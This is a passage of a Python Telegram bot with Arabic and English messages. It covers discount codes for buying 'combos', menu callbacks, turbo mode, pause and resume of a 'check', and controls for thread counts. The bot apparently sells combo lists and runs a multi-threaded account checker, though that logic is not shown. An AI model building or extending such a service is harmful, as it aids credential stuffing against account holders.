    bot.register_next_step_handler(call.message, process_discount_code, combo_name, price)

def process_discount_code(message, combo_name, original_price):
    user_id = message.chat.id
    code = message.text.strip()
    if code in discount_codes and discount_codes[code]['uses_left'] > 0:
        percent = discount_codes[code]['percent']
        new_price = int(original_price * (100 - percent) / 100)
        if new_price < 1:
            new_price = 1
        with lock:
            discount_codes[code]['uses_left'] -= 1
            if discount_codes[code]['uses_left'] == 0:
                del discount_codes[code]
            save_data()
        bot.send_message(user_id, get_text('discount_code_valid', user_id).format(percent=percent, new_price=new_price))
        markup = telebot.types.InlineKeyboardMarkup()
        confirm_text = "✅ شراء" if user_language.get(user_id, 'ar') == 'ar' else "✅ Buy"
        markup.add(telebot.types.InlineKeyboardButton(confirm_text, callback_data=f"confirm_buy|{combo_name}|{new_price}", style='success'))
        bot.send_message(user_id, "هل تريد متابعة الشراء بالسعر المخفض؟", reply_markup=markup)
    else:
        bot.send_message(user_id, get_text('discount_code_invalid', user_id))

@bot.callback_query_handler(func=lambda call: call.data == 'cancel_buy')
def cancel_buy_callback(call):
    user_id = call.message.chat.id
    bot.edit_message_text("❌ تم إلغاء العملية.", user_id, call.message.message_id)

@bot.callback_query_handler(func=lambda call: call.data == 'login')
def login_callback(call):
    try:
        bot.answer_callback_query(call.id)
    except ApiTelegramException:
        pass
    bot.send_message(call.message.chat.id, TELEGRAM_CHANNEL)

@bot.callback_query_handler(func=lambda call: call.data == 'main_menu')
def main_menu_callback(call):
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data == 'toggle_turbo')
def toggle_turbo_callback(call):
    chat_id = call.message.chat.id
    turbo_mode[chat_id] = not turbo_mode.get(chat_id, False)
    lang = user_language.get(chat_id, 'ar')
    if turbo_mode[chat_id]:
        bot.answer_callback_query(call.id, get_text('turbo_on', chat_id))
    else:
        bot.answer_callback_query(call.id, get_text('turbo_off', chat_id))
    try:
        bot.edit_message_reply_markup(chat_id=chat_id, message_id=call.message.message_id, reply_markup=create_option_buttons(chat_id))
    except ApiTelegramException:
        pass

@bot.callback_query_handler(func=lambda call: call.data == 'pause_check')
def pause_check_callback(call):
    chat_id = call.message.chat.id
    pause_check_flag[chat_id] = True
    bot.answer_callback_query(call.id, "⏸️ تم إيقاف الفحص مؤقتاً")
    update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)

@bot.callback_query_handler(func=lambda call: call.data == 'resume_check')
def resume_check_callback(call):
    chat_id = call.message.chat.id
    pause_check_flag[chat_id] = False
    bot.answer_callback_query(call.id, "▶️ تم استئناف الفحص")
    update_status_message(chat_id, add_stop_button=(not stop_check_flag.get(chat_id, False)), control_buttons=True)

@bot.callback_query_handler(func=lambda call: call.data == 'speed_up')
def speed_up_callback(call):
    chat_id = call.message.chat.id
    current = current_threads.get(chat_id, 50)
    new = min(current + 25, 100)
    current_threads[chat_id] = new
    bot.answer_callback_query(call.id, f"⚡ زيادة السرعة: {new} خيط")

@bot.callback_query_handler(func=lambda call: call.data == 'speed_down')
def speed_down_callback(call):
    chat_id = call.message.chat.id
    current = current_threads.get(chat_id, 50)
    new = max(current - 25, 10)
    current_threads[chat_id] = new
    bot.answer_callback_query(call.id, f"🐢 تقليل السرعة: {new} خيط")

load_data()
load_sold_hashes()
print('البوت يعمل ...')
bot.enable_save_next_step_handlers(delay=2)
bot.load_next_step_handlers()
while True:
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
    except ApiTelegramException as e:
        print(f"Telegram API error: {e}")
        time.sleep(5)
    except requests.exceptions.ConnectionError as e:
        print(f"Connection error: {e}")
        time.sleep(10)
    except Exception as e:
        print(f"Unexpected error: {e}")
        time.sleep(5)